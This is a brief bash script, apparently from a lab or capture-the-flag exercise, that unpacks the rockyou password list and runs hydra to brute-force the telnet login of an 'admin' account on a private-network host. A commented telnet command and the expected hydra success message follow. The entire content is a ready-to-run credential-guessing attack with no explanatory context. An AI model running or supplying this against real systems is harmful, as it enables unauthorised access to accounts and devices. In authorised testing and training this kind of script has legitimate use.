#/bin/bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt -v -V 192.168.100.2 telnet
# telnet -4 -l admin 192.168.100.1 23

# success = "1 valid password found"
